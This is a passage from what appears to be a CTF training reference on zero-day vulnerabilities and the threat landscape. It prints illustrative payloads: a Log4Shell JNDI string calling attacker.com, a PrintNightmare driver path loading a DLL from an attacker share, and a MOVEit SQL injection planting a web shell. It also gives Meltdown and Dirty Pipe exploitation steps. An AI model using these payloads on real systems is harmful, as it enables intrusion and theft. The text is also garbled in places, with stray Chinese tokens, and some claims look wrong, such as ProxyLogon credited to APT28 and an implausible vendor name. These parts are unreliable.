// Even though x was out of bounds, speculative access leaked data
```

**Meltdown (Rogue Data Cache Load)**:

```c
// Meltdown: bypass privileged memory protection via speculation
// Raise exception handler (eventually catches)
// In speculation window before exception delivery:
value = *(char *)kernel_address;           // Access kernel memory (faults eventually)
temp = array2[value * 4096];               // Cache line at secret-dependent offset
// Flush+Reload reveals the byte value
```

- **Legacy**: Fundamentally changed CPU architecture and security. Spawned an entire class of transient execution attacks (Foreshadow, ZombieLoad, RIDL, Fallout, MDS). Required microcode updates, KPTI (kernel page-table isolation), and retpoline compiler mitigations.

### 5.6 PrintNightmare (2021)

- **CVEs**: CVE-2021-1675, CVE-2021-34527
- **Vulnerability class**: Remote code execution via Windows Print Spooler (authentication bypass + file path manipulation)
- **Affected software**: Windows Print Spooler (all versions)
- **Impact**: Both remote code execution (RCE) and local privilege escalation (LPE). Exploitable over SMB without authentication in default configurations.

```python
# Simplified PrintNightmare exploitation concept
#RpcAddPrinterDriver(\pipe\spoolss,
    pDriverContainer={
        'pDriverPath': '\\\\attacker\\share\\malicious.dll',
        'pConfigPath': '\\\\attacker\\share\\malicious.dll',
        'pDataFile': '\\\\attacker\\share\\malicious.dll',
    })
# Windows Print Spooler loads the DLL as SYSTEM
```

**Why it matters**: The Print Spooler service runs as SYSTEM and is enabled by default, even on Windows Server (including Domain Controllers). An attacker could add a malicious printer driver and achieve RCE as SYSTEM. The vulnerability was initially accidentally disclosed as a patch for a different bug (CVE-2021-1675), and researchers realized the patch was incomplete, leading to CVE-2021-34527 (PrintNightmare proper).

### 5.7 Log4Shell (2021)

- **CVE**: CVE-2021-44228
- **Vulnerability class**: Improper input validation → JNDI injection → remote code execution
- **Affected software**: Apache Log4j 2.0-beta9 through 2.14.1
- **Impact**: Remote code execution in any application using Log4j to log attacker-controlled strings.

```
${jndi:ldap://attacker.com:1389/Exploit}
```

**Exploitation chain**:
1. Attacker sends a string containing `${jndi:ldap://attacker.com/Exploit}` in any field that gets logged (HTTP headers, username, chat message, etc.)
2. Log4j processes the string, encounters `${jndi:}`, and resolves the JNDI lookup
3. Log4j connects to `attacker.com:1389` via LDAP
4. Attacker's LDAP server returns a reference to a malicious Java class
5. Victim's JVM downloads and executes the class → RCE

**Why it was devastating**:
- Log4j is ubiquitous in Java enterprise applications
- The exploit string can be injected anywhere logging occurs (user-agent, username, chat messages, DNS queries, file contents)
- The attack surface is effectively "anything that logs user input"
- Patch bypasses appeared for weeks (CVE-2021-45046, CVE-2021-45105)

### 5.8 Dirty Pipe (2022)

- **CVE**: CVE-2022-0847
- **Vulnerability class**: Improper flag initialization in Linux kernel pipe buffer
- **Affected software**: Linux kernel 5.8 through 5.16.11
- **Impact**: Local privilege escalation; overwrite any read-only file or SUID binary
- **Discovered by**: Max Kellermann (independently, while debugging a corrupted log file)

```c
// The bug: in copy_page_to_iter_pipe(), the PIPE_BUF_FLAG_CAN_MERGE
// flag is NOT cleared when a new page is spliced into the pipe.
// This means subsequent writes to the pipe will merge data into
// the existing page cache page — even if it's a read-only file!

struct pipe_inode_info *pipe;
// ... splice from file into pipe (sets CAN_MERGE flag) ...
// ... subsequent write to pipe merges into the file's page cache!

// Exploitation:
// 1. Create a pipe
// 2. Fill pipe with arbitrary data (set CAN_MERGE flag on all buffers)
// 3. Drain pipe (buffers are "empty" but retain CAN_MERGE flag)
// 4. splice() a target read-only file into the pipe
// 5. write() arbitrary data into the pipe → merged into page cache!
// 6. Target file now has attacker data (in memory, persists until reboot)
```

**CTF relevance**: Dirty Pipe is elegantly simple. The core insight is that the kernel fails to reinitialize `pipe_buf->flags` when splicing, leaving `PIPE_BUF_FLAG_CAN_MERGE` set. This allows writing to any file the process can read — including `/etc/passwd`, `/etc/crontab`, or SUID binaries.

### 5.9 FORCEDENTRY / BlastDoor (2021)

- **CVE**: CVE-2021-30860 (attributed to NSO Group's Pegasus spyware)
- **Vulnerability class**: Integer overflow → heap overflow → code execution in iMessage
- **Affected software**: iOS (all versions prior to 15.0)
- **Impact**: Zero-click remote code execution via iMessage (no user interaction required)

**Technical overview**:
- The exploit arrived as a GIF attachment in an iMessage, which iOS automatically processes in a sandboxed environment (BlastDoor)
- The core exploit targeted the CoreGraphics PDF parser
- An integer overflow in the PDF JBIG2 decoder led to heap corruption
- The attacker used JBIG2's logical operation features to construct a virtual Turing machine in JBIG2 stream composition, then used that to boot-strap the exploit
- The JBIG2 exploit achieved code execution within the BlastDoor sandbox
- A second exploit escaped the BlastDoor sandbox
- A third exploit achieved kernel-level privileges

**Significance**: FORCEDENTRY demonstrated that even Apple's hardened, sandboxed message-processing pipeline could be defeated. It also revealed NSO Group's extraordinary capability — the JBIG2 virtual machine technique is one of the most sophisticated exploit techniques ever discovered.

### 5.10 MOVEit Transfer SQL Injection (2023)

- **CVE**: CVE-2023-34362
- **Vulnerability class**: SQL injection in a web application
- **Affected software**: Progress MOVEit Transfer (managed file transfer solution)
- **Impact**: Remote code execution via SQL injection → file exfiltration

**Exploitation chain**:
1. SQL injection in the `machine` parameter of an API endpoint
2. `UNION`-based SQL injection to extract database contents
3. Crafted SQL to insert a web shell into the MOVEit web root
4. Web shell provides arbitrary command execution as the MOVEit service account

```sql
-- Simplified injection concept
' UNION SELECT NULL,NULL,NULL,'<%@ WebHandler Language="C#" Class="x" %>'
-- Injects ASPX web shell intoMOVEit's web-accessible directory
```

**Impact**: Exploited by the Clop ransomware group (TA505) to steal data from over 2,500 organizations worldwide, affecting more than 67 million individuals. Organizations affected included US government agencies, BBC, British Airways, Shell, and numerous universities.

**Why this matters**: While SQL injection is considered a "well-understood" vulnerability class, it continues to be a primary zero-day vector because:
1. Enterprise software often has gaps in input validation despite decades of guidance
2. The attack surface of enterprise file transfer tools is large and high-value
3. The blast radius (managed file transfer = all transferred files) is enormous

---

## 6. Current Threat Landscape

### 6.1 Zero-Day Exploitation Trends (2024-2025)

**Key statistics and trends**:

- **Record volumes**: Google TAG reported a record number of zero-days exploited in-the-wild in 2023 (97), with 2024 tracking similarly high. This continues an upward trend from ~15 per year in the mid-2010s.
- **Browser zero-days dominate**: Chrome (V8), Safari (JavaScriptCore/WebKit), and Edge zero-days account for the largest share of ITW exploitation.
- **Enterprise platforms**: Microsoft Exchange, Ivanti, Fortinet, and Cisco continue to be primary targets for network-based zero-days.
- **iOS exploitation surge**: iOS zero-days exploited ITW increased significantly, driven by commercial surveillance vendors (CSVs) and nation-state groups.
- **Supply chain attacks**: Zero-days in upstream dependencies (e.g., XZ Utils backdoor attempt in March 2024) represent a growing trend. The attack surface shifts from the application itself to its build pipeline and dependencies.

**Prolific vulnerability classes in 2024-2025**:

| Rank | Class | Examples | Trend |
|------|-------|---------|-------|
| 1 | Type confusion (browser) | V8 JIT, JSC IC bugs |持续性 high |
| 2 | Logic/authorization bypass | Exchange OAuth, API auth bugs | Increasing |
| 3 | UAF (kernel/browser) | io_uring, Chrome POC | Stable/persistent |
| 4 | SQL/NoSQL injection | MOVEit, enterprise apps | Persistent |
| 5 | SSRF | Cloud metadata, internal services | Increasing |
| 6 | Deserialization | Fastjson, Java chains | Declining but persistent |
| 7 | Hardware/side-channel | Downfall, Inception, ZenBleed | Lower volume, high impact |

### 6.2 APT Groups Known for Zero-Day Usage

| Group | Affiliation | Notable Zero-Day Activity | Zero-Days Used |
|-------|-------------|---------------------------|----------------|
| **APT28 (Fancy Bear)** | Russia (GRU) | Microsoft Exchange, iOS, Windows | ProxyLogon chain, multiple Windows LPEs |
| **APT29 (Cozy Bear)** | Russia (SVR) | SolarWinds supply chain, iOS | Multiple Exchange and iOS zero-days |
| **Sandworm** | Russia (GRU 74455) | NotPetya, Ukrainian infrastructure | EternalBlue, OPC UA bugs, Industroyer |
| **APT41 (Double Dragon)** | China (MSS) | Supply chain, gaming, enterprise | Cisco, Citrix, Zoho zero-days |
| **Volt Typhoon** | China (MSS/PLA) | US critical infrastructure persistence | Fortinet, Ivanti zero-days |
| **Hafnium** | China | Microsoft Exchange | CVE-2021-26855, CVE-2021-27065 |
| **Charming Kitten** | Iran | Mobile surveillance, phishing | iOS zero-click, Android zero-days |
| **NSO Group** | Israel (commercial) | Pegasus spyware platform | FORCEDENTRY, multiple iOS zero-days |
| **Citizen Lab discoveries** | Various CSVs | Targeted surveillance of journalists/activists | Multiple zero-click iOS/Android |
| **Lazarus Group** | North Korea | Cryptocurrency heists, WMD proliferation | Multiple crypto exchange zero-days |
| **Kimsuky** | North Korea | Cyber espionage, spear-phishing | Apple zero-days, browser chains |

### 6.3 The Commercial Surveillance Vendor Ecosystem

A significant and growing segment of zero-day exploitation is driven by **Commercial Surveillance Vendors (CSVs)** — companies that develop and sell zero-day exploits to government clients for lawful interception and surveillance.

**Major CSVs**:
- **NSO Group** (Israel): Pegasus spyware, targeting iOS and Android. Known for FORCEDENTRY and many other iOS zero-days.
- **Candiru** (Israel): Devastating Windows zero-days, Mercenary spyware.
- **Intellexa** (Greece): Predator spyware, targeting Android and Chrome.
- **Cytrox** (North Macedonia): Predator spyware, targeting iOS and Android.
- **QuaDream** (Israel): Reign spyware, iOS zero-click exploits.
- **Preston Health Group / Variston** (Italy/enigmatic): Various zero-day exploit chains.

**Impact on the zero-day market**:
- CSVs are the **primary drivers** of mobile zero-day discovery and exploitation
- They have shifted the iOS zero-day market from nation-state-only to a broader market
- Their activities are being tracked by Google TAG, Apple Threat Intelligence, and Citizen Lab
- Apple's Lockdown Mode and BlastDoor were direct responses to CSV exploitation

### 6.4 Defensive Trends and Mitigations

**Modern mitigation landscape**:

| Mitigation | Platform | Status | Bypass Trend |
|-----------|----------|--------|-------------|
| **ASLR** | All | Near-universal | Information leaks still viable; bruteforce on 32-bit |
| **Stack canaries** | All | Near-universal | Leaked via info disclosure, format strings |
| **NX/DEP** | All | Universal | ROP/JOP/COOP chains |
| **PIE** | Linux, macOS, Windows | Increasing | Leaking binary base; partial overwrites |
| **PAC** | ARM64 (Apple M1+) | Growing | PAC bypass via logic bugs,侧channels |
| **MTE** | ARM64 (with ARMv8.5+) | Limited deployment | UAF marking challenges; allocation timing |
| **CFI** | Windows (Intel CET), LLVM-CFI | Growing | Logic bugs, type confusion in CFI-permitted targets |
| **Sandboxing** | Browsers, mobile OS | Standard | Cross-process bugs, IPC abuse |
| **SECCOMP** | Linux | Growing | Syscall filtering bypass via allowed syscalls |

**Emerging defenses for 2024-2025**:

- **Memory Tagging**: ARM Memory Tagging Extension (MTE) and Apple's upcoming memory tagging for Apple Silicon aim to detect use-after-free and buffer overflow at runtime. First deployed in Android on Pixel 8.
- **Hardware CFI**: Intel CET (Control-flow Enforcement Technology) and ARM BTI (Branch Target Identification) provide hardware-enforced forward-edge CFI.
- **Rust adoption**: Linux kernel and Windows driver frameworks increasingly adopt Rust for memory safety. While not a panacea (logic bugs remain), it eliminates entire classes of memory corruption.
- **Exploit mitigations in compilers**: `-fhardened`, stack clash protection, `-fcf-protection`, and emerging options for variable-length array checks.
- **AI-assisted vulnerability discovery**: Large language models (LLMs) and specialized ML models being explored for automated fuzzing, crash triage, and vulnerability pattern detection.

### 6.5 CTF-Oriented Zero-Day Research Methodology

For CTF competitors focused on zero-day discovery and exploitation:

**Phase 1: Target Selection & Reconnaissance**

```bash
# Identify attack surface
strings target_binary | grep -i "flag\|key\|secret"
checksec --file=target_binary  # Check mitigations
ltrace ./target_binary         # Library calls
strace ./target_binary         # Syscalls
```

**Phase 2: Vulnerability Discovery**

- **Fuzzing**: Use AFL++, libFuzzer, or Honggfuzz with custom dictionaries
- **Static analysis**: CodeQL, Semgrep, Joern for pattern-based bug finding
- **Manual audit**: Focus on syscall handlers, parser code, IPC boundaries

**Phase 3: Exploitation Primitives**

Build from a memory corruption primitive toward a stronger primitive:

```
Corruption Primitive          → Intermediate Primitive      → Final Goal
─────────────────────          ─────────────────────          ──────────
Arbitrary offset write   →   Known-address write        →  Overwrite function pointer
Heap overflow             →   Tcache poisoning           →  malloc() returns target addr
Stack buffer overflow    →   ROP chain                   →  execve("/bin/sh", ...)
UAF with type confusion  →   Fake object with vptr       →  Call attacker-controlled func
Info leak (heap addr)    →   Defeat ASLR                 →  Precise ROP/JOP targeting
```

**Phase 4: Chain Building** (for multi-stage challenges)

```
[Initial Access] → [LPE / Sandbox Escape] → [Data Exfiltration / Flag Read]
     │                    │                         │
  e.g., web RCE      e.g., kernel LPE          e.g., read /flag
  e.g., binary pwn   e.g., container escape     e.g., pivot to another host
```

**Key resources for CTF zero-day skills**:
- Practice on past CTF challenges (CTFtime, CTFarchives)
- Study exploit databases: Exploit-DB, Packet Storm
- Read full-chain exploit writeups (Google Project Zero, SSR Labs)
- Master kernel exploitation: pawnyable, kernel-exploit-factory
- Browser exploitation: V8 exploitation techniques,-browser-pwn tutorials

---

## Appendix: Key References

1. Akyaz et al., "A Study of the Security Vulnerabilities in the Linux Kernel," 2012.
2. Google Project Zero, "0day "In the Wild" database," https://googleprojectzero.blogspot.com/
3. Microsoft MSTIC, "Nation-state threat actors," various reports.
4. MITRE ATT&CK, "Exploit Public-Facing Application," T1190.
5. MITRE CWE Top 25: https://cwe.mitre.org/top25/
6. Bromium, "Into the Web of Profit," zero-day market economics.
7. RAND Corporation, "Zero-Day Vulnerability Lifetimes," 2017.
8. Xiao et al., "Motive: A Practical Memory Error Vulnerability Mitigation Approach," 2023.
9. Larabel, "Linux Kernel 2024 Security Report," Phoronix.

---

*Document version: 1.0 — Last updated: April 2026*
*Classification: Academic Reference — For CTF Training and Security Research*